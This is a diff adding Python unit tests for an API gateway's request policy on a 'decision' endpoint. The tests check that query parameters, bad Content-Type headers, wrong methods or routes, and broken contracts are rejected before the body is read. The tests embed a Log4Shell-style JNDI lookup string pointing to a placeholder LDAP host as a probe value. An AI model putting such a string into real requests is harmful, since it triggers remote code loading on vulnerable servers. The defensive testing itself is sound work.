@@ -279,6 +279,46 @@ class ProfilePolicyTests(unittest.TestCase):
                 rerank = {"model": "Cohere-rerank-v4.0-fast", "query": "Synthetic query", "documents": ["Synthetic document"]}
                 cases.append(case("cohere-rerank-unchanged", **{**base, "operation": "rerank", "path": "/rerank",
                     "query": {"texts": "synthetic"}, "headers": {"Content-Type": "text/plain"}, "body": rerank}))
+        literal = "${jndi:ldap://waf-probe.invalid/synthetic}"
+        cls.decision_body = {"model": "decision-1", "state": {literal: {"text": "Synthetic code example"}},
+                             "questions": {literal: {"type": "choice", "instructions": "Review the inert source text.",
+                                                     "criteria": {literal: "A synthetic source label", "other": "Other"}}}}
+        decision_config = apis["microsoft-decision-v1"]["authorization"]
+        decision = {"config": decision_config, "api": "microsoft-decision-v1", "operation": "systemone",
+                    "path": "/systemone", "headers": {"Content-Type": "application/json"}, "body": cls.decision_body}
+        cases.append(case("decision-native-request", **decision))
+        cases.append(case("decision-json-charset", **{**decision, "headers": {"Content-Type": "Application/JSON; charset=UTF-8"}}))
+        cases.append(case("decision-revision-request", **{**decision, "api": "microsoft-decision-v1;rev=2"}))
+        for suffix, patch in (
+            ("query", {"query": {"arbitrary": "synthetic"}}),
+            ("state-query", {"query": {"state.message": literal}}),
+            ("question-key-query", {"query": {"questions." + literal: "synthetic"}}),
+            ("duplicate-query", {"query": {"state.message": ["one", "two"]}}),
+            ("api-version", {"query": {"api-version": "v1"}}),
+            ("query-before-body", {"query": {"state.message": literal}, "rawBody": "{"}),
+            ("method", {"method": "GET"}),
+            ("missing-type", {"headers": {}}),
+            ("wrong-type", {"headers": {"Content-Type": "text/plain"}}),
+            ("duplicate-type", {"headers": {"Content-Type": ["application/json", "application/json"]}}),
+            ("combined-type", {"headers": {"Content-Type": "application/json, application/json"}}),
+            ("wrong-route", {"path": "/systemone/neighbor"})):
+            cases.append(case("decision-reject-" + suffix, **{**decision, **patch}))
+        for suffix, field, value in (("wrong-kind", "kind", "registeredOperation"),
+                                    ("wrong-format", "bodyFormat", "multipart")):
+            changed = json.loads(json.dumps(decision_config))
+            changed["operationConstraints"]["systemone"][field] = value
+            cases.append(case("decision-reject-" + suffix, **{**decision, "config": changed}))
+        cases.append(case("decision-reject-missing-contract", **{**decision,
+                          "config": {**decision_config, "operationConstraints": {}}}))
+        cases.append(case("decision-revision-query", **{**decision, "api": "microsoft-decision-v1;rev=2",
+                          "query": {"questions.synthetic.instructions": literal}}))
+        cases.append(case("decision-wrong-model", **{**decision, "body": {**cls.decision_body, "model": "unapproved-synthetic-model"}}))
+        cases.append(case("decision-other-api", **{**decision, "api": "another-api", "query": {"state.message": literal},
+                          "headers": {"Content-Type": "text/plain"}}))
+        other_config = {**decision_config, "operationConstraints": {
+            "synthetic-other": decision_config["operationConstraints"]["systemone"]}}
+        cases.append(case("decision-other-operation", **{**decision, "operation": "synthetic-other", "path": "/synthetic-other",
+                          "config": other_config, "query": {"state.message": literal}, "headers": {"Content-Type": "text/plain"}}))
         for name, query, models in (("ws-default", {}, ["standard"]), ("ws-mini", {"model": "mini"}, ["standard", "mini"]),
                                     ("ws-mini-denied", {"model": "mini"}, ["standard"]),
                                     ("ws-unknown", {"model": "unknown"}, ["standard", "mini"]),
@@ -423,6 +463,34 @@ Add-Type -TypeDefinition (Get-Content -Raw (Join-Path $PSScriptRoot 'policy.cs')
         self.assertTrue(rerank["limits"]["allowed"])
         self.assertTrue(rerank["targetAllowed"])
         self.assertEqual(rerank["queryAfter"], {"texts": ["synthetic"]})
+
+    def test_decision_contract_rejects_query_or_wrong_media_before_reading_body(self):
+        for suffix in ("query", "state-query", "question-key-query", "duplicate-query", "api-version", "query-before-body",
+                       "method", "missing-type", "wrong-type", "duplicate-type", "combined-type", "wrong-route",
+                       "wrong-kind", "wrong-format", "missing-contract"):
+            name = "decision-reject-" + suffix
+            self.assertFalse(self.results[name]["requestAllowed"], name)
+            self.assertEqual(self.results[name]["reads"], 0, name)
+        self.assertFalse(self.results["decision-revision-query"]["requestAllowed"])
+        self.assertEqual(self.results["decision-revision-query"]["reads"], 0)
+
+    def test_decision_native_data_and_unrelated_contracts_keep_their_existing_behavior(self):
+        for suffix in ("native-request", "json-charset", "revision-request"):
+            name = "decision-" + suffix
+            result = self.results[name]
+            self.assertTrue(result["requestAllowed"], name)
+            for stage in ("profile", "decision", "limits"):
+                self.assertTrue(result[stage]["allowed"], (name, stage))
+            self.assertTrue(result["targetAllowed"], name)
+            self.assertEqual(json.loads(result["bodyAfter"]), self.decision_body, name)
+            self.assertEqual(result["queryAfter"], {}, name)
+        for suffix in ("other-api", "other-operation"):
+            name = "decision-" + suffix
+            self.assertTrue(self.results[name]["requestAllowed"], name)
+            self.assertIn("state.message", self.results[name]["queryAfter"], name)
+        rejected_model = self.results["decision-wrong-model"]
+        self.assertTrue(rejected_model["requestAllowed"])
+        self.assertFalse(rejected_model["targetAllowed"])
 
     def test_profile_and_model_binding_remain_while_native_modalities_reach_provider(self):
         for name in ("unknown", "duplicate", "wrong-model", "responses-image-unknown-model"):
